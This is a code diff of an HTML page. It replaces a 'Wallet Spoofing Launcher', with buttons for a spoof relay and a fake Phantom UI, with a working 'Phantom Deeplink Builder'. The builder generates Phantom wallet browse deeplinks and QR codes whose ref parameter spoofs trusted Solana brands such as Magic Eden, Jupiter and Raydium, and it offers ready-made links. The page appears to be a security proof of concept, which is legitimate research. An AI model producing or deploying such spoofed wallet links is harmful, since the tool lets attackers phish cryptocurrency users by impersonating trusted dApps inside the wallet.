@@ -1,32 +1,131 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Wallet Spoofing Launcher</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Phantom Browse Deeplink – Solana Spoof PoC Builder</title>
   <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-    button {
-      padding: 12px 24px;
-      margin: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
+    body{font-family:system-ui,Segoe UI,Inter,Roboto,Arial,sans-serif;margin:24px;line-height:1.45}
+    h1{margin:0 0 8px}
+    .muted{color:#6b7280}
+    .row{display:flex;gap:12px;flex-wrap:wrap}
+    .row > *{flex:1 1 360px}
+    label{font-weight:600;display:block;margin-top:10px}
+    input,select,button,textarea{width:100%;padding:10px;margin-top:6px;border:1px solid #e5e7eb;border-radius:10px}
+    textarea{min-height:86px}
+    .btn{width:auto;display:inline-block;padding:10px 14px;cursor:pointer;background:#f9fafb}
+    .card{border:1px solid #e5e7eb;border-radius:14px;padding:16px;margin:12px 0;box-shadow:0 1px 8px rgba(0,0,0,.04)}
+    #qr{margin-top:12px}
+    code{background:#f5f5f7;padding:2px 6px;border-radius:6px}
   </style>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js" crossorigin="anonymous"></script>
 </head>
 <body>
-  <h1>🚀 Wallet Spoofing Launcher</h1>
+  <h1>Phantom Deeplink Builder – <span class="muted">Solana</span></h1>
+  <p class="muted">Format: <code>https://phantom.app/ul/browse/&lt;URL-ENCODED target&gt;?ref=&lt;URL-ENCODED ref&gt;</code></p>
 
-  <button onclick="openWindow('ulay.html')">Launch Spoof Relay</button><br>
-  <button onclick="openWindow('phantom-ui.html')">Open Fake Phantom UI</button><br>
-  <button onclick="openWindow('deep-link.html')">Launch Mobile Deep Link</button>
+  <div class="card">
+    <div class="row">
+      <div>
+        <label>Target (dibuka di webview Phantom)</label>
+        <input id="target" placeholder="https://ujangsec.github.io/phantom-poc/target.html" />
+        <small class="muted">Default: <code>/phantom-poc/target.html</code> di repo kamu.</small>
+      </div>
+      <div>
+        <label>Preset Ref (spoof brand)</label>
+        <select id="preset">
+          <option value="https://magiceden.io">Magic Eden</option>
+          <option value="https://jup.ag">Jupiter</option>
+          <option value="https://raydium.io">Raydium</option>
+          <option value="https://phantom.app">Phantom (self)</option>
+          <option value="__custom">Custom…</option>
+        </select>
+        <input id="ref" placeholder="https://example.com (jika pilih Custom)" style="display:none" />
+      </div>
+    </div>
+
+    <label>Tambahan query ke target (opsional)</label>
+    <input id="q" placeholder="?via=phantom-browse&case=spoof-ref" />
+
+    <div style="margin-top:14px">
+      <button id="build" class="btn">Build Deeplink</button>
+      <a id="open" class="btn" href="#" rel="noreferrer noopener">Open in Phantom</a>
+    </div>
+
+    <label>Deeplink</label>
+    <textarea id="out" readonly></textarea>
+
+    <div id="qr"></div>
+  </div>
+
+  <div class="card">
+    <h3>Quick Links (siap pakai)</h3>
+    <div id="quick"></div>
+  </div>
 
   <script>
-    function openWindow(path) {
-      window.open(path, '_blank', 'width=400,height=600');
+    const $ = id => document.getElementById(id);
+    const originHost = location.origin;
+
+    // default isi
+    window.addEventListener("DOMContentLoaded", () => {
+      $("target").value = `${originHost}/phantom-poc/target.html`;
+      $("q").value = "?via=phantom-browse&case=solana-spoof";
+      renderQuick();
+    });
+
+    $("preset").addEventListener("change", (e) => {
+      const v = e.target.value;
+      $("ref").style.display = (v === "__custom") ? "block" : "none";
+      if (v !== "__custom") $("ref").value = "";
+    });
+
+    function currentRef() {
+      const v = $("preset").value;
+      if (v === "__custom") return ($("ref").value || "").trim();
+      return v;
+    }
+
+    function buildLink() {
+      const tRaw = ($("target").value || "").trim();
+      const q = ($("q").value || "").trim();
+      const ref = currentRef();
+
+      if (!tRaw) { alert("Isi Target dulu"); return; }
+      if (!ref) { alert("Isi Ref (atau pilih preset)"); return; }
+
+      const target = tRaw + (q ? (tRaw.includes("?") ? q.replace(/^\?/, "&") : q) : "");
+      const dl = `https://phantom.app/ul/browse/${encodeURIComponent(target)}?ref=${encodeURIComponent(ref)}`;
+      $("out").value = dl;
+      $("open").href = dl;
+      const qrBox = $("qr");
+      qrBox.innerHTML = "";
+      new QRCode(qrBox, { text: dl, width: 220, height: 220, correctLevel: QRCode.CorrectLevel.M });
+      return dl;
+    }
+
+    $("build").onclick = buildLink;
+
+    function makeQuick(ref) {
+      const t = `${originHost}/phantom-poc/target.html`;
+      const q = "?via=phantom-browse&case=quick";
+      const dl = `https://phantom.app/ul/browse/${encodeURIComponent(t + q)}?ref=${encodeURIComponent(ref)}`;
+      const a = document.createElement("a");
+      a.href = dl; a.textContent = ref.replace(/^https?:\/\//,''); a.style.display = "inline-block";
+      a.style.marginRight = "12px"; a.style.marginBottom = "8px";
+      a.rel = "noreferrer noopener";
+      return a;
+    }
+
+    function renderQuick() {
+      const box = $("quick");
+      box.innerHTML = "";
+      [
+        "https://magiceden.io",
+        "https://jup.ag",
+        "https://raydium.io",
+        "https://phantom.app"
+      ].forEach(ref => box.appendChild(makeQuick(ref)));
     }
   </script>
 </body>
